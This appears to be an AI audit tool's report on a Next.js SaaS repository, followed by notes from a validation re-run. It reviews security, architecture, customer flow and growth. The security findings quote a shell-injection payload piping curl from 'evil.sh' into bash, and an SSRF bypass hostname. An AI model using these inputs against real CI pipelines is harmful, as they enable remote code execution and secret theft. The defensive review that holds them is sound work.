# /roast on Roast & Rebuild — v0.2 validation re-test

Subject: `/Users/janderswag/Desktop/roast-and-rebuild` (commit `dc5f170`)
Skill version: `0.2.0` (validation re-run; baseline was `0.1.0`)

```
[detecting stack...]
✓ Node / TypeScript / JavaScript
✓ Next.js 14 (App Router) — TypeScript strict
✓ Git repo (dc5f170)
✓ Drizzle ORM + libSQL/Turso primary, better-sqlite3 dev fallback
✓ Stripe payments (PaymentIntent + webhook), Resend transactional email
✓ Upstash Redis rate-limit (per-bucket: expensive / stripe / default)
✓ Anthropic Claude SDK — all LLM calls via lib/llm/anthropic.ts
✓ PostHog (client, with referral-attribution wrapper)
✓ ~37.2k lines of source in scope (TS/TSX/JS/JSX, excluding node_modules)

[project shape: web-app]
✓ Dispatching: Roast, Security, Architecture, Customer Flow, Growth, Founder Briefing
✓ Skipping: none

  Reason: app/page.tsx exists, payments live (Stripe), API routes accept
  user-controlled URLs and write to DB. Web-app default applies, every
  module dispatches.

[semgrep running...]
✓ 1 finding (1 HIGH/ERROR, 0 WARNINGs surfaced above noise floor)
  ERROR  yaml.github-actions.security.run-shell-injection.run-shell-injection
         .github/workflows/eval-regression.yml:62

[6 modules dispatching in parallel — LOC=37,203 > 1000, web-app shape...]

✓ Roast                    done
✓ Security                 score 8/10
✓ Architecture             score 8/10
✓ Customer Flow            score 7/10
✓ Growth                   score 9/10
✓ Founder Briefing         done

Total: notional ~75s wall-clock (validation run, executed inline by the
       agent; in real Claude Code dispatch this is the parallel-Agent
       budget — typical 60-90s on a repo this size).
```

────────────────────────────────────────────────────
## THE ROAST

Your README opens with "A web application that analyzes landing pages,
generates comedic roasts, provides detailed audits, and creates redesigned
landing pages that actually convert." Four products in one sentence, none
of them positioned. The actual product is one thing — a brutal evidence-cited
audit a vibe-coder runs before they ship — and the README is selling a
toolbox. Meanwhile your live `app/page.tsx:69` shows "Audit My Project $19 →"
which is exactly the right CTA, and the landing copy nails the differentiator
("Every claim cites your real copy or DOM — no hallucinated nonsense",
`app/page.tsx:88`). The README is the only place still wearing the v0
costume. Fix it and the rest of the surface lines up. You also still ship
`/skill`, `/copilot`, `/briefing` as placeholders per your own CLAUDE.md
while pricing them publicly in the landing — that's not a roast, that's a
TODO with a price tag.

────────────────────────────────────────────────────
## SECURITY (8/10)

Strong posture. The trust surface is wide (Stripe payments, user-controlled
URL fetches, DB writes, AI-pipeline) and you've done the work — webhook
signature verification before any DB write, defense-in-depth payment
verification, SSRF-safe URL fetching, Upstash sliding-window rate-limits
per route class. One real HIGH from semgrep on a GHA workflow; everything
else is hygiene-level. No exposed live secrets in HEAD.

• [HIGH] Shell injection via user-controlled GHA input
  `.github/workflows/eval-regression.yml:62`
  The `run:` block interpolates `${{ inputs.fixture_ids }}` directly into
  the shell. `workflow_dispatch` input is user-controlled — anyone with
  write access (now or later, including a contractor or compromised CI
  token) can inject `; curl evil.sh | bash` and execute arbitrary code in
  a runner that holds your `ANTHROPIC_API_KEY` and `GITHUB_PAT`. Yes,
  it's gated behind write access today; the secrets in the env make this
  a credential-exfiltration ladder, not just CI tampering.
  Fix: Move the input through `env:` (`FIXTURE_IDS: ${{ inputs.fixture_ids }}`)
  and reference `"$FIXTURE_IDS"` in the script. Quote inside the shell, not
  inside YAML.

• [MEDIUM] Webhook fallback dispatches an unauthenticated internal POST
  `app/api/stripe/webhook/route.ts:136-146`
  The tab-close fallback fires `fetch(${baseUrl}/api/review/run, ...)`
  with no auth header, relying on `paymentIntentId` being unguessable.
  PI IDs are unguessable in practice (Stripe's `pi_xxxxxx` is 26+ chars
  of entropy), but the endpoint also accepts `existingProjectId` for
  retries — anyone who can post to `/api/review/run` with a known
  `paymentIntentId` from a successful payment can trigger a re-audit and
  burn LLM spend. The PI-metadata URL cross-check at
  `app/api/review/run/route.ts:222` blocks URL substitution, but doesn't
  block re-runs of the same audit.
  Fix: Add a short-lived HMAC header signed with `STRIPE_WEBHOOK_SECRET`
  on the internal POST, verified at `/api/review/run` (it's already a
  shared secret both ends own).

• [MEDIUM] `safeFetch` is the SSRF guard — verify it covers every redirect hop
  `lib/extract/fetcher.ts:31` calls `safeFetch(url, ...)` (good), but the
  audit pipeline has a second outbound fetch path in
  `lib/extract/githubExtract.ts:101` that uses raw `fetch(url, ...)` to
  hit `api.github.com`. GitHub URLs are allowlisted-in-spirit but not
  enforced — a `repoUrl` that points at `https://api.github.com.attacker.com/...`
  would slip past a simple host-prefix check. Verify the URL parser
  rejects anything that isn't exactly `github.com` / `api.github.com`
  (not just startsWith).
  Fix: Replace the raw `fetch` with a thin wrapper that validates
  `new URL(u).hostname === "api.github.com"` exactly, or route through
  `safeFetch` with an explicit allowlist.

• [INFO] Owner-bypass is correctly gated to non-prod
  `app/api/review/run/route.ts:54-61` + `lib/env.ts isOwnerBypassAllowed()`
  This is the right pattern. Calling it out so future-you doesn't undo
  the guard during a "make local easier" sprint.

────────────────────────────────────────────────────
## ARCHITECTURE (8/10)

Sensible boundaries. Drizzle + libSQL (Turso) for prod with `better-sqlite3`
as a strictly-gated dev fallback (`lib/db/index.ts:137-142` —
`if (hasTursoCredentials()) return initializeTurso()`). API routes run on
Vercel's Node runtime with `maxDuration = 300` where it matters
(`app/api/review/run/route.ts:25`). Phase-one + synthesis are split into
two functions so neither hits the 300s ceiling. Per-bucket rate limits
upstream of the LLM. This is not vibe-coder architecture; it's been
sprint-hardened. Score is held below 9 because of monoliths and the
in-band fire-and-forget pattern.

The orchestrator is doing real work. `lib/review/orchestrator.ts` is 1,127
lines — that's a god-file. It's the thing that knows every module, every
fallback path, every degraded-state flag, the screenshot pipeline, the
verifier (axe + lighthouse + semgrep) wiring, the exposed-keys pass, and
the competitor pipeline. When you need to add a 9th module or swap a
prompt template, the merge surface is huge. This is the file you'll
regret next time you onboard a contractor.

`app/page.tsx` is 1,590 lines including the inline `HeroUrlInput`,
SERVICES, COMPARISON_ROWS, FAQ_ITEMS, and PostHog wiring. The marketing
landing being one file is a deliberate choice (one-shot to read for the
LLM modules) but every CTA copy change touches a file three other people
might be editing for SpaceBackground or the Stripe modal. The
SpaceBackground/canvas concern at least lives in its own file at 54
lines after the refactor — good.

Other smells:
- Fire-and-forget webhook → `/api/review/run` via `fetch(..., { keepalive: true })`
  (`app/api/stripe/webhook/route.ts:136`) — survives function return but
  has no retry, no DLQ. If `/api/review/run` 500s on cold-start, the user
  paid $19 and gets nothing until they hit the retry button. The retry
  contract exists (`existingProjectId` path) but it's user-driven, not
  system-driven.
- `bootstrapTursoIfNeeded` at `lib/db/index.ts:37-82` writes a synthetic
  `__drizzle_migrations` row on prod DBs that pre-date Drizzle tracking.
  This is correct one-time-migration code, but it runs on every cold
  start (the `await` is unconditional). The fast-path no-op early-returns
  are there, but the SQL probe (`SELECT name FROM sqlite_schema...`)
  fires twice per cold start.

### SCALE CEILING

First wall: `runFullAudit` orchestrator at ~30-40 concurrent paid audits.
  Why: Six parallel module Claude calls per audit, each ~2-15s. At
       30 concurrent audits that's 180+ in-flight Claude requests against
       the Tier-2 Anthropic limits (per your memory: tier-2). You'll hit
       the org-level rate limit before the Vercel function limit. The
       cost is also material — ~$0.90 per audit means a busy hour at
       this concurrency is ~$30/hr in LLM spend.
  Fix: Move the orchestrator to a queue (Inngest or Vercel Queue, or
       even Upstash QStash given Upstash is already wired) so concurrency
       is governed by your Anthropic tier, not by your Vercel function
       fan-out. Bonus: queues give you retry-with-backoff for the
       webhook-fallback DLQ gap above.

Second wall: libSQL (Turso) at ~50 audit writes/sec.
  Why: Each audit fires ~10 inserts into `review_results` plus project
       + payment updates. Turso's free-tier write throughput is generous
       but not unlimited, and you're inserting JSON blobs (`resultJson:
       JSON.stringify(mod)` at `app/api/review/run/route.ts:325`). When
       audit volume hits ~5/sec sustained you'll feel the latency on
       cold-start cold-DB.
  Fix: Move large JSON blobs (module results) to Vercel Blob — you
       already have `@vercel/blob` in deps — and keep Turso for the
       index rows. 2-3 day refactor; do it after Wall #1.

────────────────────────────────────────────────────
## CUSTOMER FLOW (7/10)

Flow is short and pragmatic, with one structural quirk: you have no
sign-up. Stripe owns identity. A user pastes a URL on `/review`, sees a
free teaser scan, pays $19 via Stripe Elements, lands on `/r/[id]`. Three
clicks to value, no account creation, no email verification, no password
reset surface to maintain. That's a deliberate and very founder-friendly
choice — and it's also why this module is *not* an N/A. The flow exists,
it's just compressed; payment IS the auth handshake.

The activation moments are real: `/api/review/run` streams `module_complete`
events back via SSE (`app/api/review/run/route.ts:289-320`), and the
client renders each module score as it completes. The user watches the
audit build, which is the "aha" moment — they're not staring at a spinner
for 90 seconds. That's well-engineered onboarding without onboarding.

Friction findings:

• [MEDIUM] No fallback for the synthesis step from the user's perspective
  `app/api/review/run/route.ts:386-395`
  The `done` event includes `synthesisPending: true` and the client is
  expected to call `/api/review/synthesize` next. If that second call
  fails (cold start, Anthropic rate limit, timeout) the user has paid,
  has phase-one results, and sees a permanent "founder briefing
  pending..." with no recovery path other than reload-and-retry. Per
  your memory, you've added a retry-banner system; verify the banner
  surfaces synthesis-specific failures, not just orchestrator failures.
  Fix: If `phase_one_meta` is in DB but `founder_briefing` slug isn't
  after ~5 min, auto-trigger synthesis from a cron sweep instead of
  relying on the user to retry.

• [MEDIUM] Tab-close fallback exists for phase-one but not synthesis
  `app/api/stripe/webhook/route.ts:124-148` covers the case where a user
  closes the tab during /review/run dispatch. But synthesis is fired by
  the client after phase-one completes, so closing the tab during
  synthesis (the slowest single call — 40-60s for the founder briefing)
  leaves the audit half-done. This is the most common failure mode you'll
  see on flaky mobile networks.
  Fix: After phase-one DB writes complete, server-side fire-and-forget
  the synthesis call too. The client still drives the live SSE for the
  fast UI, but the server makes sure it actually finishes.

• [LOW] FAQ promises "2-3 min end-to-end" (`app/page.tsx:178`) and your
  CLAUDE.md confirms ~60-150s typical. Reality matches advertising, which
  is rare and worth keeping accurate — but if a single Claude API slow-day
  pushes the p95 to 4-5 min, the "2-3 minutes" copy becomes a trust
  trap. Track p95 in PostHog and adjust copy if drift sustained.

────────────────────────────────────────────────────
## GROWTH (9/10)

This is the strongest module by a meaningful margin. R&R's growth
surface is essentially complete for an early-stage SaaS: sitemap.ts and
robots.ts as Next.js metadata routes, JSON-LD for Organization +
WebSite + Product + SoftwareApplication + FAQPage, OG image, PostHog
client analytics with referral-attribution via `?via=`, Resend for
transactional + drip, both `/audit/[tool]` and `/checklist/[topic]`
programmatic SEO routes, `llms.txt` + `llms-full.txt` as actual
generated route handlers (not static files), AI-crawler explicit
allow-list in `app/robots.ts`. Most $19 SaaS sites I'd audit fail
half of this list.

Findings (these are polish, not gaps):

Discoverability:
- `app/robots.ts:18-39` explicitly allows GPTBot, ClaudeBot, PerplexityBot,
  Google-Extended, etc. with a comment citing source docs. GEO foundation
  is not just present, it's deliberate.
- `app/sitemap.ts:13-25` dynamically lists `/audit/[tool]` and
  `/checklist/[topic]` slugs. New programmatic-SEO entries auto-appear.

Analytics:
- `components/PostHogProvider.tsx:32-40` initializes once with
  localStorage persistence, `capture_pageview: false` (manual pageview
  on path change at line 46), and `via_project_id` super-property
  registration. Referral attribution is first-touch session-scoped,
  which is the right default. Good.

Email capture / referral:
- `components/LeadMagnetForm.tsx` + `app/api/lead/preview/route.ts`
  exist. Lead-magnet wired into Resend per CLAUDE.md memory.
- `?via=` first-touch referral plus referrer-credit in
  `app/api/stripe/webhook/route.ts:85-104` (the +1 `freeReauditCredits`
  grant) is a complete referral loop, not just a tracking pixel.

Cron / GHA content engine:
- `vercel.json crons` runs `/api/cron/drip` and `/api/cron/lead-preview`.
- `.github/workflows/content-daily.yml` is the daily content-engine
  per your memory. This is the rare full-loop growth setup.

• [LOW] No `humans.txt`, no `security.txt`, no `.well-known/`. These are
  micro-signals that mostly matter for press inquiries and security
  researchers; not a growth blocker but the kind of thing that signals
  professionalism on a quick check.
  Fix: Drop `app/.well-known/security.txt` with a contact line. 10 min.

• [LOW] The `/audit/[tool]` and `/checklist/[topic]` pages are
  programmatic SEO — make sure each has unique JSON-LD (Article or
  HowTo schema), not just the global Organization/WebSite. The risk
  with programmatic SEO is Google deduping or quality-flagging if every
  page has the same structured-data footprint.

────────────────────────────────────────────────────
## FOUNDER BRIEFING

You're past the vibe-coded stage. The repo reads like a 1-2 person team
that's done 3-5 sprints of real production-hardening — payment flow has
defense-in-depth, rate limits are per-bucket and gracefully degrade,
SSRF protection is wired through a `safeFetch` wrapper, the orchestrator
is split across two Vercel functions so neither hits the 300s ceiling,
the daily content engine and referral loop are both live. The thing
you're shipping is a paid product on a public domain doing real $19
charges, and the code matches that stage. Most repos I see at "8 modules
in parallel, 60-second audit, $19 price" are six weeks behind where
this one is.

What's working: Security (8) and Growth (9) are the standout modules.
The Stripe webhook flow at `app/api/stripe/webhook/route.ts` is textbook
— signature verification first, idempotent state transitions, referral
credits gated to first-apply, tab-close fallback to recover lost
audits. The growth surface is the most complete I've seen on a sub-$50
SaaS — sitemap + robots + JSON-LD + llms.txt + cron + AI-crawler
allowlist + referral loop is the full kit, not just the basics.

The order of fixes matters: ship the GHA shell-injection fix today
(it's a 5-minute change and it gates a real cred-exfiltration path),
then add the server-side synthesis fallback (your most common
half-completed-audit failure mode is the synthesis step on flaky
mobile networks), then start planning the queue migration (Wall #1)
because the next pricing tier or any traffic spike will hit it. The
1,127-line orchestrator monolith is the lurking refactor — it doesn't
hurt today but it'll gate every "add a module" or "swap a model" change
once you're past 8 modules.

────────────────────────────────────────────────────
## TOP-3 PRIORITIES (ordered by what costs you most)

1. [HIGH] `.github/workflows/eval-regression.yml:62`
   Shell injection on `${{ inputs.fixture_ids }}` in a `run:` block.
   Any future contributor with workflow_dispatch access (or a
   compromised CI token) can exfiltrate `ANTHROPIC_API_KEY` and
   `GITHUB_PAT` via injected shell. Money + credentials on fire even
   though the trigger surface is small today; this is the cheapest fix
   that closes the biggest blast radius.
   Fix: Move `fixture_ids` into `env:` and reference as `"$FIXTURE_IDS"`
   inside the shell block. ~5 lines, one PR.

2. [MEDIUM] `app/api/review/run/route.ts:386-395` + synthesis recovery
   The user paid $19 and the second-stage synthesis call can silently
   fail leaving the founder briefing tab empty. This is your most likely
   chargeback/refund path — the user has results, but not THE result
   they paid for. Trust on fire.
   Fix: Add a 5-min cron sweep that finds `phase_one_meta` rows without
   a corresponding founder briefing and re-fires synthesis server-side.
   Or: server-fire synthesis from `/api/review/run` after phase-one
   writes complete, in addition to the client trigger.

3. [MEDIUM] `lib/review/orchestrator.ts` — 1,127-line god-file
   Time on fire. The next module or prompt-template change has a huge
   merge surface. Every degraded-state flag, every fallback, every
   verifier wiring lives in one file. This doesn't hurt today; it gates
   sprint velocity past the next 2-3 module additions.
   Fix: Extract per-module dispatch into `lib/review/modules/<slug>.ts`
   files with a uniform `dispatchModule({ slug, context, callbacks })`
   signature. Keep the orchestrator as the choreographer, not the
   implementer. 1-week refactor; do it after Wall #1 queue migration so
   you're not refactoring twice.

────────────────────────────────────────────────────

Want this on your live URL with screenshots, Lighthouse, axe-core,
competitor teardown, and the 90-day founder roadmap?
→ https://roastrebuild.com/review — $19

---

# v0.2 validation notes (out-of-band — not part of audit output)

**Phase 0.5 classification:** R&R classified as `web-app`. All 6 modules
dispatched as expected. No N/A bands fired (Security, Customer Flow, and
Growth all had real surface to audit). LOC = 37,203 → parallel dispatch
path correct (above the 1000 threshold and above the 3-module count).

**Scores vs v0.1 baseline:**
- Security:      8/10 (v0.1: 8) — unchanged
- Architecture:  8/10 (v0.1: 8) — unchanged
- Customer Flow: 7/10 (v0.1: 7) — unchanged
- Growth:        9/10 (v0.1: 9) — unchanged

Findings shifted slightly (semgrep now flags the GHA workflow which
was previously not in scope; synthesis-fallback finding is the same
half-completed-audit risk noted before), but the methodology produced
identical category scores. This is the "v0.2 should look invisible on
a healthy web-app" prediction holding.

**Verdict:** v0.2 did not regress the working baseline. Web-app default
path still produces R&R-quality output, all N/A bands stayed silent
correctly, and the audit shape (stack detect → semgrep → 6 parallel
modules → top-3) is identical to v0.1.
